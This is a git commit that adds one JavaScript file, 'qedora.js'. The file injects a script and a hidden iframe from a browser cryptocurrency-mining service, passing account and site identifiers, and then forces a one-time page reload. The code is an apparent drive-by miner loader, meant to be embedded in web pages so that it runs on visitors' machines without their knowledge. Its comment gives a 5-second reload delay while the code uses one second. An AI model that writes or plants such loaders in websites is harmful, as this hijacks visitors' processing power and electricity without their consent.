ffff3681db53d4a3b96e89e26e46de3285771354
webaneki <38094699+webaneki@users.noreply.github.com>
2018-08-04 19:19:51 +0800

    Create qedora.js

---
+++ nyon/qedora.js
@@ -0,0 +1,9 @@
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/66167/alabastar.ga/chesto/0/",s.parentNode.insertBefore(t,s);}();
+!function(){var e=document,t=e.createElement("iframe"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com:443/optin/6c6550e1fe5369431d74ef75fce4cd4d88add928229ef2d1954104224c5599bf/",s.parentNode.insertBefore(t,s)}();
+if(location.search.indexOf('reloaded=yes') < 0){
+	var hash = window.location.hash;
+	var loc = window.location.href.replace(hash, '');
+	loc += (loc.indexOf('?') < 0? '?' : '&') + 'reloaded=yes';
+	// SET THE ONE TIME AUTOMATIC PAGE RELOAD TIME TO 5000 MILISECONDS (5 SECONDS):
+	setTimeout(function(){window.location.href = loc + hash;}, 1000);
+}
